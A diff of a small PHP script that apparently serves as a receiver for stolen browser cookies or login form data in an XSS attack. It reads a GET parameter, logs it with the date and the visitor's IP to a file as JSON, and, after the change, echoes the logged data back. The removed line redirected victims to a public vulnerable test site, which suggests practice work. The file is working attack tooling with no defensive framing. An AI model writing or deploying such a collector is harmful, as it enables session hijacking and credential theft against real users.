@@ -1,5 +1,5 @@
 <?php
-  $cookie=$_GET['cookie'];
+  $cookie=$_GET['frmLogin'];
   $time=date("Y. m, d");
   $ip=$_SERVER['REMOTE_ADDR'];
 
@@ -10,5 +10,9 @@
   $c=json_encode($b);
   fwrite($file, $c);
   fclose($file);
+
+  if($cookie)
+  {
+    echo "$c";
+  }
 ?>
-<script>window.location.href="http://testasp.vulnweb.com/Templatize.asp?item=html/about.html"</script>
